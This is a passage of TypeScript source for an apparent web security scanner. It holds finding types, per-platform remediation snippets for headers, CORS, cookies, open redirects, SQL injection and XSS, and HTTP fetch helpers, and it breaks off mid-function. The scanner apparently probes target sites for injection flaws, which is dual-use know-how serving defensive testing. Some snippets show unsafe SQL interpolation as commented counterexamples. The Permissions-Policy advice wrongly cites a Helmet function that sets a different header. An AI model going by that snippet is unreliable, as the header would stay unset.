import https from "https";
import http from "http";
import dns from "dns/promises";
import { URL } from "url";
import pLimit from "p-limit";
import { validateSensitiveFile, validateSqlInjection, validateXssReflection } from "./response-validator.js";
import { crawl, CrawlResult, FormInfo } from "./crawler.js";
import type { ProgressCallback } from "./scan-events.js";

const INJECTION_CONCURRENCY = 5;

export interface RemediationMap {
  nginx?: string;
  apache?: string;
  nodejs?: string;
  iis?: string;
  caddy?: string;
  cloudflare?: string;
  php?: string;
  python?: string;
  java?: string;
  ruby?: string;
}

export interface ScanFinding {
  id: string;
  category: "dns" | "ssl" | "headers" | "server_info" | "content_discovery" | "http_methods" | "sensitive_files" | "injection";
  title: string;
  severity: "info" | "low" | "medium" | "high" | "critical";
  status: "pass" | "fail" | "warning" | "info";
  description: string;
  detail?: string | null;
  recommendation?: string | null;
  remediations?: RemediationMap | null;
  execution_poc?: string | null;
}

export interface ScanSummary {
  total: number;
  critical: number;
  high: number;
  medium: number;
  low: number;
  info: number;
  passed: number;
}

export interface CrawlSummary {
  pagesVisited: number;
  urlsDiscovered: number;
  urlsWithParams: string[];
  urls: string[];
  jsFiles: string[];
  errors: string[];
  formsFound: number;
}

export interface ScanResult {
  findings: ScanFinding[];
  summary: ScanSummary;
  responseTimeMs: number;
  serverInfo?: string | null;
  ipAddress?: string | null;
  sslValid?: boolean | null;
  sslExpiry?: string | null;
  scannedAt: string;
  crawlSummary?: CrawlSummary | null;
}

interface FetchResult {
  statusCode: number;
  headers: Record<string, string | string[] | undefined>;
  body: string;
  responseTimeMs: number;
  sslValid?: boolean;
  sslExpiry?: string | null;
}

// ── Technology-specific remediation lookup ────────────────────────────────────

const HEADER_TABS = (header: string, value: string): RemediationMap => ({
  nginx:
`# In your nginx server{} block
add_header ${header} "${value}" always;`,
  apache:
`# In httpd.conf / .htaccess (requires mod_headers)
Header always set ${header} "${value}"`,
  nodejs:
`// With Helmet (recommended)
import helmet from 'helmet';
app.use(helmet()); // enables many headers automatically

// Or manually:
app.use((_req, res, next) => {
  res.setHeader('${header}', '${value}');
  next();
});`,
  iis:
`<!-- In web.config <system.webServer> -->
<httpProtocol>
  <customHeaders>
    <add name="${header}" value="${value}" />
  </customHeaders>
</httpProtocol>`,
  caddy:
`# In your Caddyfile site block
header ${header} "${value}"`,
});

const REMEDIATION_MAP: Record<string, RemediationMap> = {
  "missing-hsts": {
    nginx:
`# In your nginx server{} block (HTTPS only)
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;`,
    apache:
`# In httpd.conf / .htaccess (requires mod_headers + HTTPS vhost)
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"`,
    nodejs:
`// With Helmet
import helmet from 'helmet';
app.use(helmet.hsts({
  maxAge: 31536000,
  includeSubDomains: true,
  preload: true,
}));`,
    iis:
`<!-- In web.config -->
<httpProtocol>
  <customHeaders>
    <add name="Strict-Transport-Security"
         value="max-age=31536000; includeSubDomains; preload" />
  </customHeaders>
</httpProtocol>`,
    caddy:
`# Caddy sets HSTS automatically on HTTPS sites
# To customise, add to your Caddyfile:
header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"`,
    cloudflare:
`# Option 1 — Cloudflare Dashboard (recommended, no server changes needed):
# SSL/TLS → Edge Certificates → HTTP Strict Transport Security (HSTS)
# Enable HSTS, set max-age = 12 months, turn on includeSubDomains + Preload.

# Option 2 — Cloudflare Transform Rule (Modify Response Header):
# Rules → Transform Rules → Create Rule → Modify Response Header
# Action: Set  |  Name: Strict-Transport-Security
# Value: max-age=31536000; includeSubDomains; preload`,
  },

  "hsts-wrong-url": {
    nginx:
`# HSTS must be set on the HTTPS virtual host, not HTTP
server {
  listen 80;
  server_name example.com;
  return 301 https://$host$request_uri; # redirect to HTTPS
}
server {
  listen 443 ssl;
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
}`,
    apache:
`# .htaccess — redirect HTTP to HTTPS first
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteCond %{HTTPS} off
  RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
</IfModule>
# Then set HSTS only in the HTTPS VirtualHost
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"`,
    nodejs:
`app.use((req, res, next) => {
  if (!req.secure && process.env.NODE_ENV === 'production') {
    return res.redirect(301, 'https://' + req.headers.host + req.url);
  }
  // Set HSTS only on HTTPS connections
  if (req.secure) {
    res.setHeader('Strict-Transport-Security',
      'max-age=31536000; includeSubDomains; preload');
  }
  next();
});`,
    iis: HEADER_TABS("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload").iis!,
    caddy: HEADER_TABS("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload").caddy!,
  },

  "missing-csp": {
    nginx:
`# In your nginx server{} block
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; frame-ancestors 'none';" always;`,
    apache:
`# In httpd.conf / .htaccess
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'none';"`,
    nodejs:
`// With Helmet (recommended)
import helmet from 'helmet';
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc:  ["'self'"],
    scriptSrc:   ["'self'"],
    styleSrc:    ["'self'", "'unsafe-inline'"],
    imgSrc:      ["'self'", "data:"],
    fontSrc:     ["'self'"],
    frameAncestors: ["'none'"],
  },
}));`,
    iis:
`<!-- In web.config -->
<httpProtocol>
  <customHeaders>
    <add name="Content-Security-Policy"
         value="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none';" />
  </customHeaders>
</httpProtocol>`,
    caddy:
`header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none';"`,
    cloudflare:
`# Cloudflare Transform Rules → Modify Response Header
# Rules → Transform Rules → Create Rule → Modify Response Header
# Action: Set  |  Name: Content-Security-Policy
# Value: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none';
#
# Note: Test your CSP thoroughly — overly strict policies can break your site.
# Use report-only mode first: Content-Security-Policy-Report-Only`,
  },

  "missing-x-frame-options": {
    ...HEADER_TABS("X-Frame-Options", "SAMEORIGIN"),
    nodejs:
`// With Helmet
app.use(helmet.frameguard({ action: 'sameorigin' }));

// Or manually:
app.use((_req, res, next) => {
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  next();
});`,
    cloudflare:
`# Cloudflare Transform Rules → Modify Response Header
# Rules → Transform Rules → Create Rule → Modify Response Header
# Action: Set  |  Name: X-Frame-Options  |  Value: SAMEORIGIN`,
  },

  "missing-x-content-type": {
    ...HEADER_TABS("X-Content-Type-Options", "nosniff"),
    nodejs:
`// With Helmet
app.use(helmet.noSniff());

// Or manually:
app.use((_req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});`,
    cloudflare:
`# Cloudflare Transform Rules → Modify Response Header
# Rules → Transform Rules → Create Rule → Modify Response Header
# Action: Set  |  Name: X-Content-Type-Options  |  Value: nosniff`,
  },

  "missing-referrer-policy": {
    ...HEADER_TABS("Referrer-Policy", "strict-origin-when-cross-origin"),
    nodejs:
`// With Helmet
app.use(helmet.referrerPolicy({
  policy: 'strict-origin-when-cross-origin',
}));`,
    cloudflare:
`# Cloudflare Transform Rules → Modify Response Header
# Rules → Transform Rules → Create Rule → Modify Response Header
# Action: Set  |  Name: Referrer-Policy  |  Value: strict-origin-when-cross-origin`,
  },

  "missing-permissions-policy": {
    ...HEADER_TABS("Permissions-Policy", "camera=(), microphone=(), geolocation=(), payment=()"),
    nodejs:
`// With Helmet (v5+)
app.use(helmet.permittedCrossDomainPolicies());

// Or set manually:
app.use((_req, res, next) => {
  res.setHeader('Permissions-Policy',
    'camera=(), microphone=(), geolocation=(), payment=()');
  next();
});`,
    cloudflare:
`# Cloudflare Transform Rules → Modify Response Header
# Rules → Transform Rules → Create Rule → Modify Response Header
# Action: Set  |  Name: Permissions-Policy
# Value: camera=(), microphone=(), geolocation=(), payment=()`,
  },

  "missing-https": {
    nginx:
`# Redirect all HTTP traffic to HTTPS
server {
  listen 80;
  server_name example.com www.example.com;
  return 301 https://$host$request_uri;
}

server {
  listen 443 ssl http2;
  server_name example.com;
  # ... your SSL config here
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
}`,
    apache:
`# In your HTTP VirtualHost or .htaccess
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteCond %{HTTPS} off
  RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
</IfModule>

# In the HTTPS VirtualHost, also add HSTS:
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"`,
    nodejs:
`// Redirect HTTP → HTTPS in production
app.use((req, res, next) => {
  const proto = req.headers['x-forwarded-proto'] || (req.secure ? 'https' : 'http');
  if (proto !== 'https' && process.env.NODE_ENV === 'production') {
    return res.redirect(301, 'https://' + req.headers.host + req.url);
  }
  next();
});`,
    iis:
`<!-- web.config: HTTP → HTTPS redirect -->
<system.webServer>
  <rewrite>
    <rules>
      <rule name="HTTP to HTTPS" stopProcessing="true">
        <match url=".*" />
        <conditions>
          <add input="{HTTPS}" pattern="off" ignoreCase="true" />
        </conditions>
        <action type="Redirect" url="https://{HTTP_HOST}/{R:0}"
                redirectType="Permanent" />
      </rule>
    </rules>
  </rewrite>
</system.webServer>`,
    caddy:
`# Caddy handles HTTPS and HTTP→HTTPS redirection automatically.
# Simply use your domain name — Caddy auto-provisions TLS via Let's Encrypt:
example.com {
  # Your site config here — Caddy does the rest
}`,
    cloudflare:
`# In Cloudflare Dashboard → SSL/TLS → Edge Certificates:
# 1. Set SSL/TLS Mode to "Full (strict)"
# 2. Enable "Always Use HTTPS" toggle
# 3. Enable "HSTS" with max-age=31536000, includeSubDomains, preload
# 4. Enable "Automatic HTTPS Rewrites"

# Via Cloudflare API / Terraform:
resource "cloudflare_zone_settings_override" "https" {
  zone_id = var.zone_id
  settings {
    always_use_https = "on"
    ssl              = "strict"
    min_tls_version  = "1.2"
  }
}`,
  },

  "server-info-leaked": {
    nginx:
`# In nginx.conf (http{} block)
server_tokens off;

# For extra hardening, use headers-more-nginx-module:
# more_clear_headers Server;`,
    apache:
`# In httpd.conf or apache2.conf
ServerTokens Prod
ServerSignature Off`,
    nodejs:
`// Express removes X-Powered-By by default with Helmet:
import helmet from 'helmet';
app.use(helmet());

// Or just:
app.disable('x-powered-by');`,
    iis:
`<!-- In web.config — remove Server header -->
<system.webServer>
  <security>
    <requestFiltering removeServerHeader="true" />
  </security>
  <httpProtocol>
    <customHeaders>
      <remove name="X-Powered-By" />
      <remove name="X-AspNet-Version" />
    </customHeaders>
  </httpProtocol>
</system.webServer>`,
    caddy:
`# Caddy doesn't expose version by default.
# Remove or replace the Server header:
header -Server
header -X-Powered-By`,
  },

  "x-powered-by-leaked": {
    nginx:
`# Nginx does not add X-Powered-By by default.
# If you see it, your app framework adds it.
# Suppress with headers-more-nginx-module:
# more_clear_headers X-Powered-By;`,
    apache:
`# Disable PHP's X-Powered-By (in php.ini):
expose_php = Off

# Or strip it in Apache:
Header always unset X-Powered-By`,
    nodejs:
`// Remove Express's default X-Powered-By header:
app.disable('x-powered-by');

// Or with Helmet (does this automatically):
import helmet from 'helmet';
app.use(helmet());`,
    iis:
`<!-- In web.config -->
<httpProtocol>
  <customHeaders>
    <remove name="X-Powered-By" />
    <remove name="X-AspNet-Version" />
    <remove name="X-AspNetMvc-Version" />
  </customHeaders>
</httpProtocol>`,
    caddy:
`header -X-Powered-By`,
  },

  "trace-enabled": {
    nginx:
`# Deny TRACE method globally in nginx.conf
map $request_method $block_trace {
  default 0;
  TRACE   1;
}

server {
  if ($block_trace) { return 405; }
}`,
    apache:
`# In httpd.conf or apache2.conf (global)
TraceEnable Off`,
    nodejs:
`// Middleware to block TRACE requests
app.use((req, res, next) => {
  if (req.method === 'TRACE') {
    return res.status(405).set('Allow', 'GET,POST,PUT,DELETE,PATCH,OPTIONS,HEAD')
                           .send('Method Not Allowed');
  }
  next();
});`,
    iis:
`<!-- In web.config: disable TRACE verb -->
<system.webServer>
  <security>
    <requestFiltering>
      <verbs>
        <add verb="TRACE" allowed="false" />
        <add verb="TRACK" allowed="false" />
      </verbs>
    </requestFiltering>
  </security>
</system.webServer>`,
    caddy:
`# Block TRACE method in Caddyfile
@trace method TRACE TRACK
respond @trace 405`,
  },

  "missing-spf": {
    cloudflare:
`# Add an SPF TXT record in your DNS zone (Cloudflare Dashboard → DNS):
Type:    TXT
Name:    @  (root domain)
Content: v=spf1 include:_spf.google.com ~all
TTL:     Auto

# Adjust the include: directive to match your mail provider:
# Google Workspace: include:_spf.google.com
# Microsoft 365:    include:spf.protection.outlook.com
# SendGrid:         include:sendgrid.net`,
    nginx:
`# SPF is a DNS record — configure it at your DNS provider, not your web server.
# Example TXT record to add:
# @ IN TXT "v=spf1 include:_spf.google.com ~all"

# If using Bind / named:
example.com. IN TXT "v=spf1 include:_spf.google.com ~all"`,
    apache:
`# SPF is a DNS record — configure it at your DNS provider, not Apache.
# Example TXT record:
@ IN TXT "v=spf1 include:_spf.google.com ~all"

# Common include values:
# Google Workspace: include:_spf.google.com
# Microsoft 365:    include:spf.protection.outlook.com`,
    nodejs:
`// SPF is a DNS record — add via your DNS provider or infrastructure as code.
// Example with AWS Route 53 (Terraform):
resource "aws_route53_record" "spf" {
  zone_id = aws_route53_zone.primary.zone_id
  name    = "@"
  type    = "TXT"
  ttl     = 300
  records = [
    "v=spf1 include:_spf.google.com ~all"
  ]
}`,
  },

  "missing-dmarc": {
    cloudflare:
`# Add a DMARC TXT record in Cloudflare Dashboard → DNS:
Type:    TXT
Name:    _dmarc
Content: v=DMARC1; p=quarantine; rua=mailto:dmarc@example.com; ruf=mailto:dmarc@example.com; adkim=s; aspf=s
TTL:     Auto

# Policy values: none (monitor) → quarantine → reject (strict)
# Start with p=none to monitor, then move to quarantine/reject`,
    nginx:
`# DMARC is a DNS record — add via your DNS provider.
# Example TXT record:
_dmarc.example.com. IN TXT "v=DMARC1; p=quarantine; rua=mailto:dmarc@example.com"

# Policy guidance:
# p=none       — monitoring only, no enforcement
# p=quarantine — suspect mail goes to spam
# p=reject     — fail outright (most protective)`,
    apache:
`# DMARC is a DNS record — add via your DNS provider, not Apache.
# Example:
_dmarc IN TXT "v=DMARC1; p=quarantine; rua=mailto:dmarc@example.com; adkim=s; aspf=s"`,
    nodejs:
`// DMARC is a DNS record. Add via infrastructure as code:
// AWS Route 53 (Terraform):
resource "aws_route53_record" "dmarc" {
  zone_id = aws_route53_zone.primary.zone_id
  name    = "_dmarc"
  type    = "TXT"
  ttl     = 300
  records = [
    "v=DMARC1; p=quarantine; rua=mailto:dmarc@example.com"
  ]
}`,
  },

  // Injection: SQLi — code-level remediations
  "injection-sqli": {
    nodejs:
`// NEVER interpolate user input into SQL strings.
// Use parameterized queries (node-postgres):
import { Pool } from 'pg';
const pool = new Pool();

// ✓ Safe — parameter is sent separately
const { rows } = await pool.query(
  'SELECT * FROM users WHERE id = $1 AND name = $2',
  [userId, userName]
);

// ✗ Unsafe — DO NOT DO THIS:
// const { rows } = await pool.query(\`SELECT * FROM users WHERE id = \${userId}\`);`,
    php:
`<?php
// Use PDO prepared statements — NEVER concatenate user input into SQL.

$pdo = new PDO('mysql:host=localhost;dbname=mydb', $user, $pass);
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false); // important!

// ✓ Safe
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id AND name = :name');
$stmt->execute([':id' => $id, ':name' => $name]);
$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

// ✗ Unsafe — DO NOT DO THIS:
// $rows = $pdo->query("SELECT * FROM users WHERE id = $id");`,
    python:
`# Use Django ORM or SQLAlchemy — both parameterize automatically.

# Django ORM (safe by default):
from myapp.models import User
user = User.objects.get(id=user_id, name=user_name)

# Raw SQL with Django (still parameterized):
from django.db import connection
with connection.cursor() as cursor:
    cursor.execute('SELECT * FROM users WHERE id = %s', [user_id])
    rows = cursor.fetchall()

# SQLAlchemy Core:
from sqlalchemy import text
result = conn.execute(text('SELECT * FROM users WHERE id = :id'), {'id': user_id})`,
    java:
`// Use PreparedStatement — NEVER use Statement with string concat.
import java.sql.*;

// ✓ Safe
String sql = "SELECT * FROM users WHERE id = ? AND name = ?";
try (PreparedStatement stmt = conn.prepareStatement(sql)) {
    stmt.setInt(1, userId);
    stmt.setString(2, userName);
    ResultSet rs = stmt.executeQuery();
}

// Spring Data JPA (safest):
@Query("SELECT u FROM User u WHERE u.id = :id")
User findById(@Param("id") Long id);`,
    ruby:
`# ActiveRecord parameterizes queries automatically.
# ✓ Safe
User.where(id: user_id, name: user_name)
User.where('id = ? AND name = ?', user_id, user_name)

# ✗ Unsafe — DO NOT DO THIS:
# User.where("id = #{user_id}")  # string interpolation = SQL injection`,
  },

  // Injection: XSS — output encoding remediations
  "injection-xss": {
    nodejs:
`// Always encode output. Use a template engine with auto-escaping.

// React JSX is safe by default (JSX escapes values automatically):
const UserInput = ({ text }) => <div>{text}</div>; // ✓ Safe

// Avoid dangerouslySetInnerHTML unless you sanitize first:
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(dirty) }} />

// In Express with EJS (auto-escaped):
// Use <%= variable %> (escaped) not <%- variable %> (raw)

// For API responses, set Content-Type correctly:
res.setHeader('Content-Type', 'application/json');`,
    php:
`<?php
// Always use htmlspecialchars() for output in HTML context.
// ✓ Safe
echo htmlspecialchars($userInput, ENT_QUOTES | ENT_HTML5, 'UTF-8');

// With Twig template engine (auto-escapes by default):
// {{ user_input }}          — escaped (safe)
// {{ user_input | raw }}    — raw (only use when sure it's safe)

// For rich HTML content, use HTML Purifier:
require_once '/path/to/htmlpurifier/library/HTMLPurifier.auto.php';
$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$clean = $purifier->purify($dirty);`,
    python:
`# Django templates auto-escape all variables by default.
# {{ user_input }}        — auto-escaped (safe)
# {{ user_input|safe }}   — raw (only use when you control the content)

# For manual escaping:
from django.utils.html import escape, format_html
safe_output = escape(user_input)

# Jinja2 also auto-escapes when configured:
from jinja2 import Environment
env = Environment(autoescape=True)

# For rich HTML: use bleach
import bleach
clean = bleach.clean(user_input, tags=['b', 'i', 'u'], strip=True)`,
    java:
`// Use OWASP Java Encoder for all output encoding.
import org.owasp.encoder.Encode;

// HTML context:
out.print("<div>" + Encode.forHtml(userInput) + "</div>");

// JavaScript context:
out.print("<script>var x = '" + Encode.forJavaScript(userInput) + "';</script>");

// Spring Thymeleaf (auto-escapes):
// th:text="\${userInput}"    — escaped (safe)
// th:utext="\${userInput}"   — raw (avoid unless sanitized)`,
    ruby:
`# Rails ERB auto-escapes by default.
# <%= user_input %>       — auto-escaped (safe)
# <%== user_input %>      — raw HTML (avoid unless sanitized)
# <%= raw(user_input) %>  — raw HTML (avoid unless sanitized)

# For sanitizing HTML content:
ActionView::Base.sanitized_allowed_tags = ['b', 'i', 'strong', 'em']
sanitized = ActionController::Base.helpers.sanitize(user_input)

# Use rails-html-sanitizer for fine-grained control:
sanitizer = Rails::Html::SafeListSanitizer.new
safe = sanitizer.sanitize(user_input, tags: %w[b i ul li])`,
  },
};

// Alias stored-XSS to same remediations as reflected XSS
REMEDIATION_MAP["injection-stored-xss"] = REMEDIATION_MAP["injection-xss"];

// ── CORS remediations ─────────────────────────────────────────────────────────
REMEDIATION_MAP["cors-wildcard"] = {
  nginx:
`# Restrict CORS to a specific trusted origin instead of wildcard
# In nginx server{} block:
add_header Access-Control-Allow-Origin "https://your-trusted-app.com" always;

# For multiple allowed origins, use a map:
map $http_origin $cors_origin {
    default                          "";
    "https://trusted-app.com"        $http_origin;
    "https://other-trusted-app.com"  $http_origin;
}
server {
    add_header Access-Control-Allow-Origin $cors_origin always;
}`,
  apache:
`# Replace wildcard with specific trusted origins
# In httpd.conf or .htaccess (requires mod_headers):
<IfModule mod_headers.c>
  Header always set Access-Control-Allow-Origin "https://your-trusted-app.com"
</IfModule>

# For dynamic origin validation, use SetEnvIf:
SetEnvIf Origin "^https://trusted-app\\.com$" CORS_ORIGIN=$0
Header always set Access-Control-Allow-Origin %{CORS_ORIGIN}e env=CORS_ORIGIN`,
  nodejs:
`// Restrict CORS to an explicit allowlist — never use wildcard for sensitive APIs
import cors from 'cors';

const allowedOrigins = [
  'https://your-app.com',
  'https://other-trusted.com',
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
}));`,
  cloudflare:
`# Cloudflare Transform Rules → Modify Response Header
# Replace the existing Access-Control-Allow-Origin header:
# Rules → Transform Rules → Create Rule → Modify Response Header
# Action: Set  |  Name: Access-Control-Allow-Origin
# Value: https://your-trusted-app.com
#
# For dynamic origin validation, use Cloudflare Workers:
# addEventListener('fetch', event => {
#   const origin = event.request.headers.get('Origin');
#   const allowed = ['https://your-app.com'];
#   if (allowed.includes(origin)) {
#     response.headers.set('Access-Control-Allow-Origin', origin);
#   }
# });`,
};
REMEDIATION_MAP["cors-reflect-origin"] = REMEDIATION_MAP["cors-wildcard"];
REMEDIATION_MAP["cors-credentials-wildcard"] = REMEDIATION_MAP["cors-wildcard"];

// ── Cookie security remediations ──────────────────────────────────────────────
REMEDIATION_MAP["cookie-no-httponly"] = {
  nodejs:
`// Set HttpOnly on all session/auth cookies
// With Express + express-session:
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,   // ← prevents JavaScript access (document.cookie)
    secure: true,     // ← HTTPS only
    sameSite: 'lax',  // ← CSRF protection
    maxAge: 24 * 60 * 60 * 1000,
  },
}));

// With express-cookie directly:
res.cookie('session', value, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
});`,
  php:
`<?php
// Set HttpOnly flag on all cookies
// In php.ini (applies globally):
session.cookie_httponly = 1
session.cookie_secure   = 1
session.cookie_samesite = Lax

// Or programmatically for session cookie:
session_set_cookie_params([
    'lifetime' => 86400,
    'path'     => '/',
    'secure'   => true,
    'httponly' => true,     // ← key flag
    'samesite' => 'Lax',
]);
session_start();

// For custom cookies:
setcookie('auth', $value, [
    'httponly' => true,
    'secure'   => true,
    'samesite' => 'Lax',
]);`,
  java:
`// Spring Boot — configure session cookie in application.properties:
// server.servlet.session.cookie.http-only=true
// server.servlet.session.cookie.secure=true
// server.servlet.session.cookie.same-site=lax

// Or programmatically:
@Configuration
public class SessionConfig {
    @Bean
    public TomcatServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory factory = new TomcatServletWebServerFactory();
        factory.addContextCustomizers(context -> {
            context.setUseHttpOnly(true);
        });
        return factory;
    }
}`,
  python:
`# Django — settings.py:
SESSION_COOKIE_HTTPONLY = True    # ← prevents JS access
SESSION_COOKIE_SECURE   = True    # ← HTTPS only
SESSION_COOKIE_SAMESITE = 'Lax'  # ← CSRF protection
CSRF_COOKIE_HTTPONLY    = True

# Flask:
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE='Lax',
)`,
};
REMEDIATION_MAP["cookie-no-secure"]        = REMEDIATION_MAP["cookie-no-httponly"];
REMEDIATION_MAP["cookie-no-samesite"]      = REMEDIATION_MAP["cookie-no-httponly"];
REMEDIATION_MAP["cookie-samesite-none-insecure"] = REMEDIATION_MAP["cookie-no-httponly"];

// ── Open redirect remediations ────────────────────────────────────────────────
REMEDIATION_MAP["open-redirect"] = {
  nodejs:
`// Validate redirect destinations against an allowlist
// Never redirect to arbitrary user-supplied URLs
function isSafeRedirect(url: string, allowedOrigins: string[]): boolean {
  try {
    const parsed = new URL(url, 'https://your-app.com');
    return allowedOrigins.includes(parsed.origin);
  } catch {
    return false;
  }
}

// In your route handler:
app.get('/redirect', (req, res) => {
  const { url } = req.query;
  const allowed = ['https://your-app.com', 'https://partner-site.com'];

  if (!url || !isSafeRedirect(String(url), allowed)) {
    return res.status(400).send('Invalid redirect destination');
  }
  res.redirect(String(url));
});

// Better: use relative paths only — strip the origin completely
app.get('/redirect', (req, res) => {
  const { next } = req.query;
  const safePath = String(next || '/').replace(/^[\\/]+/, '/');
  if (!safePath.startsWith('/') || safePath.startsWith('//')) {
    return res.redirect('/');
  }
  res.redirect(safePath);
});`,
  php:
`<?php
// Validate redirect — only allow relative paths or pre-approved domains
function safe_redirect(string $url): string {
    $allowed = ['https://your-app.com', 'https://trusted-site.com'];
    try {
        $parsed = parse_url($url);
        if (!isset($parsed['host'])) {
            // Relative URL — strip leading slashes to prevent protocol-relative
            return '/' . ltrim($url, '/');
        }
        $origin = ($parsed['scheme'] ?? 'https') . '://' . $parsed['host'];
        if (in_array($origin, $allowed, true)) return $url;
    } catch (Exception $e) {}
    return '/'; // fallback to home
}
header('Location: ' . safe_redirect($_GET['redirect'] ?? '/'));`,
  python:
`# Django — never redirect to raw user input
from urllib.parse import urlparse
from django.shortcuts import redirect

def safe_redirect_view(request):
    next_url = request.GET.get('next', '/')
    # Allow only relative URLs (no scheme/host)
    parsed = urlparse(next_url)
    if parsed.netloc or parsed.scheme:
        next_url = '/'  # reject absolute URLs
    return redirect(next_url)

# Or use Django's built-in is_safe_url:
from django.utils.http import url_has_allowed_host_and_scheme
if not url_has_allowed_host_and_scheme(next_url, allowed_hosts={request.get_host()}):
    next_url = settings.LOGIN_REDIRECT_URL`,
  java:
`// Spring — restrict redirects to relative paths or allowed domains
@GetMapping("/redirect")
public ResponseEntity<Void> redirect(@RequestParam String url) {
    List<String> allowedHosts = List.of("your-app.com", "trusted-site.com");
    try {
        URI uri = new URI(url);
        if (uri.isAbsolute() && !allowedHosts.contains(uri.getHost())) {
            return ResponseEntity.badRequest().build();
        }
        return ResponseEntity.status(HttpStatus.FOUND)
                             .location(uri).build();
    } catch (URISyntaxException e) {
        return ResponseEntity.badRequest().build();
    }
}`,
};

/**
 * Post-processes findings to attach structured technology-specific remediations.
 * Matches by exact finding ID first, then by category prefix for injection findings.
 */
function withRemediations(findings: ScanFinding[]): ScanFinding[] {
  return findings.map((f) => {
    let remediations: RemediationMap | null = null;

    if (REMEDIATION_MAP[f.id]) {
      remediations = REMEDIATION_MAP[f.id];
    } else if (f.category === "injection") {
      // Match by prefix: injection-sqli-* → injection-sqli, injection-xss-* / injection-stored-xss-* → injection-xss
      if (f.id.includes("sqli"))              remediations = REMEDIATION_MAP["injection-sqli"] ?? null;
      else if (f.id.includes("stored"))       remediations = REMEDIATION_MAP["injection-stored-xss"] ?? null;
      else if (f.id.includes("xss"))          remediations = REMEDIATION_MAP["injection-xss"] ?? null;
      else if (f.id.startsWith("open-redirect")) remediations = REMEDIATION_MAP["open-redirect"] ?? null;
    } else if (f.id.startsWith("cors-")) {
      remediations = REMEDIATION_MAP[f.id] ?? REMEDIATION_MAP["cors-wildcard"] ?? null;
    } else if (f.id.startsWith("cookie-")) {
      remediations = REMEDIATION_MAP[f.id] ?? REMEDIATION_MAP["cookie-no-httponly"] ?? null;
    }

    return remediations ? { ...f, remediations } : f;
  });
}

function fetchUrl(targetUrl: string, method = "GET", timeout = 10000): Promise<FetchResult> {
  return new Promise((resolve, reject) => {
    const parsed = new URL(targetUrl);
    const isHttps = parsed.protocol === "https:";
    const lib = isHttps ? https : http;
    const start = Date.now();

    const options: https.RequestOptions = {
      method,
      host: parsed.hostname,
      port: parsed.port || (isHttps ? 443 : 80),
      path: parsed.pathname + parsed.search,
      headers: {
        "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
        Accept: "text/html,application/xhtml+xml,*/*",
      },
      rejectUnauthorized: false,
    };

    const req = lib.request(options, (res) => {
      let body = "";
      res.on("data", (chunk) => {
        if (body.length < 50000) body += chunk;
      });
      res.on("end", () => {
        const headers: Record<string, string | string[] | undefined> = {};
        for (const [k, v] of Object.entries(res.headers)) {
          headers[k.toLowerCase()] = v;
        }

        let sslValid: boolean | undefined;
        let sslExpiry: string | null = null;

        if (isHttps) {
          const socket = (res.socket as any);
          try {
            const cert = socket?.getPeerCertificate?.();
            if (cert && cert.valid_to) {
              sslExpiry = cert.valid_to;
              sslValid = new Date(cert.valid_to) > new Date();
            } else {
              sslValid = true;
            }
          } catch {
            sslValid = true;
          }
        }

        resolve({
          statusCode: res.statusCode ?? 0,
          headers,
          body,
          responseTimeMs: Date.now() - start,
          sslValid,
          sslExpiry,
        });
      });
    });

    req.setTimeout(timeout, () => {
      req.destroy();
      reject(new Error("Request timed out"));
    });

    req.on("error", reject);
    req.end();
  });
}

/** POST variant of fetchUrl — sends a form-encoded or JSON body. */
function fetchUrlPost(
  targetUrl: string,
  body: string,
  contentType = "application/x-www-form-urlencoded",
  timeout = 10000
): Promise<FetchResult> {
  return new Promise((resolve, reject) => {
    const parsed = new URL(targetUrl);
    const isHttps = parsed.protocol === "https:";
    const lib = isHttps ? https : http;
    const start = Date.now();

    const bodyBuf = Buffer.from(body, "utf8");
    const options: https.RequestOptions = {
      method: "POST",
      host: parsed.hostname,
      port: parsed.port || (isHttps ? 443 : 80),
      path: parsed.pathname + parsed.search,
      headers: {
        "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
        "Content-Type": contentType,
        "Content-Length": bodyBuf.length,
        Accept: "text/html,application/xhtml+xml,*/*",
      },
      rejectUnauthorized: false,
    };

    const req = lib.request(options, (res) => {
      let responseBody = "";
